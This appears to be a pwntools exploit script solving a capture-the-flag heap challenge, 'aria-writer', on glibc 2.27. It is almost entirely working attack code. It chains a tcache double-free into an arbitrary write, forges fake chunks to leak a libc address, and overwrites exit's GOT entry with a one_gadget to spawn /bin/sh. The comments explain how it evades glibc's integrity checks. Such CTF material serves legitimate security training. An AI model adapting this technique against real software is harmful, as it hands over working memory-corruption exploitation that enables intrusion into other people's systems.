#0x4f2c5 execve("/bin/sh", rsp+0x40, environ)
#constraints:
#  rsp & 0xf == 0
#  rcx == NULL
#
#0x4f322 execve("/bin/sh", rsp+0x40, environ)
#constraints:
#  [rsp+0x40] == NULL
#
#0x10a38c execve("/bin/sh", rsp+0x70, environ)
#constraints:
#  [rsp+0x70] == NULL
#
from pwn import *
import sys

name_buf = 0x6020e0
exit_gotplt = 0x602078
main = 0x4008e7

def malloc(p, n, content):
    p.sendlineafter('int pls > ', '1')
    p.sendlineafter('should it be?', str(n))
    p.sendlineafter('write tho', content)

def free(p):
    p.sendlineafter('int pls > ', '2')

def arbitrary_write(p, address: int, size, data):
    malloc(p, size, 'a')
    free(p)
    free(p) 
    malloc(p, size, p64(address))
    malloc(p, size, 'a')
    malloc(p, size, data) 

def print_name(p):
    p.sendlineafter('int pls > ', '3')
    p.recvuntil('name o: :')


#context.terminal = ['tmux', 'splitw', '-h']

if 'debug' in sys.argv:
#    p = gdb.debug('./aria-writer', '''set exec-wrapper env 'LD_PRELOAD=./libc-2.27.so'\nb *main+51\nc''')
    p = gdb.debug('./aria-writer', '''set exec-wrapper env 'LD_PRELOAD=./libc-2.27.so'
b *main+368
'''
)
else:
    p = process('./aria-writer')

# preparing fake chunk on name (prev_size, size)
# I'm making size big enough that it won't be sent to tcache.
# This way I can free the fake chunk, which will leak pointers to wilderness
p.sendline(p64(0x100) + p64(0x501)) 

# need to prepare more fake chunks after, to evade the checks I bumped into...
# 1st: evade (!prev) by making a fake next chunk with correct prev_size
# 2nd: corrupted size vs. prev_size: seems that free is doing a forward consolidate.
#      that means it's calling unlink on the next chunk. Let's shut it up by pretending the next chunk is in use.
arbitrary_write(p, name_buf+0x500, 0x60, p64(0x500) + p64(0x21) + p64(0)*2 + p64(0x20) + p64(0x21))

# Creating fake chunk... Content is not important.
arbitrary_write(p, name_buf+0x10, 0x50, 'aaaaaaaa')

# Freeing it and obtaining the libc leak
free(p)
print_name(p)
leak = u64(p.recv(24)[16:])
print('Leak:', hex(leak))
offset = 0x7f9e19b23ca0 - 0x7f9e19738000 # got these with gdb
libc_base = leak - offset

# Write one_gadget on exit gotplt
one_gadget = libc_base + 0x4f322 
arbitrary_write(p, exit_gotplt, 0x40, p64(one_gadget))

p.interactive()
